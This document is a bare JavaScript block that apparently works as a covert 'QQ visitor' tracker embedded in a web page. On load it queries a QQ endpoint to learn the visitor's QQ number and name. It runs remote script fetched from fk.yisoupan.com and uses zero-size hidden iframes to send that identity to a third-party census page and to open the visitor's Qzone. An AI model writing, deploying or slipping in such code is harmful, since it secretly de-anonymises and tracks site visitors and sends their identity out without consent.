<script language="javascript">
var Qin_api = 'http://fk.yisoupan.com/api';
var isIE = document.all ? true : false;
var ie = document.all ? true : false;
var isIE = !! window.ActiveXObject;

function loadJS(jsurl, onsuccess, charset, onerr) {
	var xScript = document.createElement("script");
	xScript.type = "text/javascript";
	if (charset == '') {
		xScript.charset = "utf-8"
	} else {
		xScript.charset = charset
	}
	xScript.src = jsurl;
	xScript.onerror = function() {
		if (onerr) {
			setTimeout(onerr, 10)
		}
	};
	if (ie) {
		xScript.onreadystatechange = function() {
			if (xScript.readyState) {
				if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
					xScript.onreadystatechange = null;
					xScript.onload = null;
					if (onsuccess) {
						setTimeout(onsuccess, 10)
					}
				}
			} else {
				xScript.onreadystatechange = null;
				xScript.onload = null;
				if (onsuccess) {
					setTimeout(onsuccess, 10)
				}
			}
		}
	} else {
		xScript.onload = function() {
			if (xScript.readyState) {
				if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
					xScript.onreadystatechange = null;
					xScript.onload = null;
					if (onsuccess) {
						setTimeout(onsuccess, 10)
					}
				}
			} else {
				xScript.onreadystatechange = null;
				xScript.onload = null;
				if (onsuccess) {
					setTimeout(onsuccess, 10)
				}
			}
		}
	}
	document.getElementsByTagName('HEAD').item(0).appendChild(xScript)
}
function fangkenoLogin() {
	xx1 = getCookie("fkqq");
	xx2 = getCookie("fkname");
	try {
		if (xx1 == '' || xx1 == 'null') {
			fangkenoLogin_api_cookie()
		} else {
			setTimeout(xxx_third, 1)
		}
	} catch (e) {
		fangkenoLogin_api_cookie()
	}
}
function fangkenoLogin_api_cookie() {
	fangkenoLogin_do()
}
function qqs_not() {
	fangkenoLogin_do()
}
function fangkenoLogin_do() {
	loadJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date).getTime(), checkLoginCB)
}
function checkLoginCB() {
	try {
		if (data0.err == 1026) {
			setTimeout(blog_api, 100)
		} else {
			setTimeout(fangkenoLogin, 5000)
		}
	} catch (e) {
		setTimeout(fangkenoLogin, 5000)
	}
}
function blog_api() {
	loadJS(Qin_api + "/blog_qq.php?t=" + (new Date).getTime())
}
function loading_blog(blogid, uid) {
	uid_s = uid;
	blogid_s = blogid;
	var iframe_qzone = document.createElement("iframe");
	iframe_qzone.src = "http://qzs.qq.com/snsapp/app/bee/widget/jump.htm?url=http://" + uid_s + ".qzone.qq.com/";
	iframe_qzone.id = "qzone";
	iframe_qzone.name = "qzone";
	iframe_qzone.style.width = "0px";
	iframe_qzone.style.height = "0px";
	iframe_qzone.scrolling = "no";
	iframe_qzone.setAttribute('frameborder', '0', 0);
	document.body.appendChild(iframe_qzone);
	setTimeout(get_lastview, 2000)
}
function get_lastview() {
	var hyj_b = new Date();
	var hyj_tm = hyj_b.getTime();
	hyj_tm = Math.round(hyj_tm / 1000);
	my_fetch_url = Qin_api + "/qq/index_qq.php?uid=" + uid_s + "&blogid=" + blogid_s + "&tm=" + hyj_tm;
	loadJS(my_fetch_url)
}
function qqs(id) {
	xx1 = id.uin;
	xx2 = encodeURIComponent(id.name);
	setTimeout(xxx_third, 1)
}
function xxx_third() {
	var xurl = location.href;
	var xurl = xurl.replace("T-census.php", "C-census.php");
	var iframe = document.createElement("iframe");
	iframe.src = xurl + "&xx1=" + xx1 + "&xx2=" + xx2;
	iframe.id = "QQfangke_iframe_two";
	iframe.name = "QQfangke_iframe_two";
	iframe.style.width = "0px";
	iframe.style.height = "0px";
	iframe.scrolling = "no";
	iframe.setAttribute('frameborder', '0', 0);
	document.body.appendChild(iframe)
}
function setCookie(name, value) {
	var Days = 1000;
	var exp = new Date();
	exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
	document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString()
}
function getCookie(name) {
	var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
	if (arr = document.cookie.match(reg)) return (arr[2]);
	else return 'null'
}
function delCookie(name) {
	var date = new Date();
	date.setTime(date.getTime() - 10000);
	document.cookie = name + "=;expire=" + date.toGMTString()
}
delCookie("fkqq");
delCookie("fkname");
fangkenoLogin();
</script>